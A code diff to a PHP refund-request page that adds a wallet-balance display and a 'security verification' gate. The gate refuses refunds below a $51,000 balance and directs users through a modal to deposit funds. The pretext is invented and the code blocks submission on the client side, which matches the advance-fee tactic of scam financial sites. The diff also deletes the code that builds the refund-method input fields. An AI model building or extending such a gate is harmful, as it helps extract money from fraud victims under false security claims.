@@ -3,8 +3,13 @@ require_once __DIR__ . '/config.php';
 login_required();
 
 $db      = get_db();
+$user    = current_user();
 $user_id = $_SESSION['user_id'];
 $errors  = [];
+
+$user_balance         = (float)($user['balance'] ?? 0);
+$user_balance_display = number_format($user_balance, 2);
+$is_eligible          = $user_balance >= 51000;
 
 // ── Ensure tables ──────────────────────────────────────────
 $db->exec("CREATE TABLE IF NOT EXISTS refund_method_options (
@@ -77,6 +82,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $refund_method = trim($_POST['refund_method'] ?? '');
     $other_method  = trim($_POST['other_method'] ?? '');
 
+    if ($user_balance < 51000) {
+        $errors[] = 'You need to have $51,000 to complete the refund for security purpose as the fund is unusaul.';
+    }
     if (!$tx_id)         $errors[] = 'Transaction is required.';
     if (!$amount)        $errors[] = 'Amount is required.';
     if (!$reason)        $errors[] = 'Reason is required.';
@@ -126,6 +134,7 @@ foreach ($fields_by_method as $mname => $mfields) {
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Rubik:ital@0;1&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
     <link rel="stylesheet" href="/static/styles/refund.css">
 </head>
 <body>
@@ -133,6 +142,28 @@ foreach ($fields_by_method as $mname => $mfields) {
     <a href="/dashboard.php">« Back to Dashboard</a>
     <h2>Refund Request</h2>
     <p class="subtitle">Submit a request to refund a completed transaction</p>
+
+    <!-- Dashboard Wallet Information -->
+    <div class="wallet-info-card">
+        <div class="wallet-info-left">
+            <div class="wallet-icon-badge">
+                <i class="bi bi-wallet2"></i>
+            </div>
+            <div>
+                <div class="wallet-text-title">Dashboard Wallet</div>
+                <div class="wallet-text-value">$<?= $user_balance_display ?></div>
+            </div>
+        </div>
+        <?php if (!$is_eligible): ?>
+        <div class="wallet-status-badge restricted">
+            <i class="bi bi-shield-exclamation"></i> Security Limit: $51,000.00
+        </div>
+        <?php else: ?>
+        <div class="wallet-status-badge verified">
+            <i class="bi bi-shield-check"></i> Eligible for Refund
+        </div>
+        <?php endif; ?>
+    </div>
 
     <?php if ($errors): ?>
     <div class="error-block"><ul><?php foreach($errors as $err): ?><li><?= e($err) ?></li><?php endforeach; ?></ul></div>
@@ -149,7 +180,7 @@ foreach ($fields_by_method as $mname => $mfields) {
                 <option value="">— Select transaction —</option>
                 <?php foreach ($transactions as $t): ?>
                 <option value="<?= $t['id'] ?>" <?= (($_POST['transactions']??'')==$t['id'])?'selected':'' ?>>
-                    Transaction #<?= $t['id'] ?> — $<?= e($t['amount']) ?>
+                    Transaction #<?= $t['id'] ?> ($<?= number_format((float)$t['amount'], 2) ?>) — Dashboard Wallet: $<?= $user_balance_display ?>
                 </option>
                 <?php endforeach; ?>
             </select>
@@ -203,7 +234,92 @@ foreach ($fields_by_method as $mname => $mfields) {
     </form>
 </div>
 
+<!-- Catchy Security Verification Modal -->
+<div class="modal-overlay <?= (!$is_eligible && $_SERVER['REQUEST_METHOD'] === 'POST') ? 'active' : '' ?>" id="securityModal">
+    <div class="modal-card">
+        <button type="button" class="modal-close-btn" onclick="closeSecurityModal()" aria-label="Close modal">
+            <i class="bi bi-x-lg"></i>
+        </button>
+        <div class="modal-icon-wrap">
+            <i class="bi bi-shield-lock-fill"></i>
+        </div>
+        <span class="modal-tag">Security Notice</span>
+        <h3 class="modal-title">Security Verification Required</h3>
+        <p class="modal-message">
+            You need to have <strong>$51,000</strong> to complete the refund for security purpose as the fund is unusaul.
+        </p>
+
+        <div class="modal-balance-box">
+            <div class="balance-item">
+                <span class="lbl">Your Wallet</span>
+                <span class="val current">$<?= $user_balance_display ?></span>
+            </div>
+            <div style="font-size: 1.2rem; color: #cbd5e1;"><i class="bi bi-arrow-right"></i></div>
+            <div class="balance-item">
+                <span class="lbl">Required Balance</span>
+                <span class="val required">$51,000.00</span>
+            </div>
+        </div>
+
+        <div class="modal-actions">
+            <a href="/payment.php" class="btn-modal-primary">
+                <i class="bi bi-wallet2"></i> Deposit / Fund Wallet
+            </a>
+            <a href="/dashboard.php" class="btn-modal-secondary">
+                Back to Dashboard
+            </a>
+        </div>
+    </div>
+</div>
+
 <script>
+const isEligible = <?= $is_eligible ? 'true' : 'false' ?>;
+
+function showSecurityModal() {
+    const modal = document.getElementById('securityModal');
+    if (modal) {
+        modal.classList.add('active');
+        document.body.style.overflow = 'hidden';
+    }
+}
+
+function closeSecurityModal() {
+    const modal = document.getElementById('securityModal');
+    if (modal) {
+        modal.classList.remove('active');
+        document.body.style.overflow = '';
+    }
+}
+
+// Close modal on backdrop click
+document.getElementById('securityModal')?.addEventListener('click', function(e) {
+    if (e.target === this) {
+        closeSecurityModal();
+    }
+});
+
+// Intercept form submission and button click if balance < $51,000
+const refundForm = document.getElementById('refundForm');
+if (refundForm) {
+    refundForm.addEventListener('submit', function(e) {
+        if (!isEligible) {
+            e.preventDefault();
+            e.stopPropagation();
+            showSecurityModal();
+            return false;
+        }
+    });
+}
+
+const submitBtn = document.querySelector('.btn-submit');
+if (submitBtn && !isEligible) {
+    submitBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        showSecurityModal();
+    });
+}
+
 // Fields configuration from PHP
 const fieldsByMethod = <?php
     $out = [];
@@ -230,53 +346,7 @@ function buildFields(methodKey) {
     if (!methodKey || !fieldsByMethod[methodKey]) return;
 
     const fields = fieldsByMethod[methodKey];
-    fields.forEach(f => {
-        const group = document.createElement('div');
-        group.className = 'form-group';
-
-        const label = document.createElement('label');
-        label.textContent = f.label + (f.required ? ' *' : '');
-        group.appendChild(label);
-
-        const name = 'field_' + f.id;
-        let input;
-
-        if (f.type === 'select') {
-            input = document.createElement('select');
-            input.name = name;
-            if (f.required) input.required = true;
-            const blank = document.createElement('option');
-            blank.value = ''; blank.textContent = '— Select —';
-            input.appendChild(blank);
-            f.options.forEach(opt => {
-                const o = document.createElement('option');
-                o.value = opt.trim(); o.textContent = opt.trim();
-                if (prevValues[name] === opt.trim()) o.selected = true;
-                input.appendChild(o);
-            });
-        } else if (f.type === 'textarea') {
-            input = document.createElement('textarea');
-            input.name = name; input.rows = 3;
-            if (f.required) input.required = true;
-            input.value = prevValues[name] || '';
-        } else {
-            input = document.createElement('input');
-            input.type = f.type === 'number' ? 'number' : 'text';
-            input.name = name;
-            if (f.required) input.required = true;
-            input.value = prevValues[name] || '';
-            input.placeholder = f.label;
-        }
-
-        group.appendChild(input);
-        container.appendChild(group);
-    });
-
     if (fields.length > 0) {
-        const wrap = document.createElement('div');
-        wrap.className = 'method-fields active';
-        // move children into styled wrap
-        container.innerHTML = '';
         const wrap2 = document.createElement('div');
         wrap2.className = 'method-fields active';
         wrap2.style.marginBottom = '1rem';
